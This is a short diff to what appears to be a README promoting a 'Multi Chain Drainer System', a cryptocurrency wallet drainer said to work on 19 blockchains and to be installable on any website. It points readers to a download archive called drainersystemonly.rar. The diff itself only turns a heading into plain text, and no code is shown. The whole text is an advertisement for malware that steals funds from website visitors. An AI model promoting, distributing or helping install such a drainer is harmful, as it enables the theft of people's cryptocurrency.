@@ -4,7 +4,7 @@
 
 # 💯 Multi Chain Drainer System 💯
 
-# Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
+Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
 Installation on any website files and documentation included 🔥
 
 # Installation & Instructions of the draining system on any WEBSITE : drainersystemonly.rar
